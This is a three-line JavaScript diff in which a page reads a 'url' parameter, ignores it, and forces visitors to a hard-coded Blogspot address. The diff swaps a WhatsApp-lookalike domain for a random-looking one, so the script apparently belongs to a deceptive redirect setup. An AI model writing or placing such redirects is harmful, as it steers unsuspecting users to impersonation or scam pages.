@@ -1,3 +1,3 @@
 const looking = new URLSearchParams(window.location.search);
 const directed = looking.get('url');
-window.location.href = 'https://watshapss.blogspot.com/2025/07/my-whatsapp-my-whatsapp.html?m=1';
+window.location.href = 'https://xfgy6563.blogspot.com/?m=1';
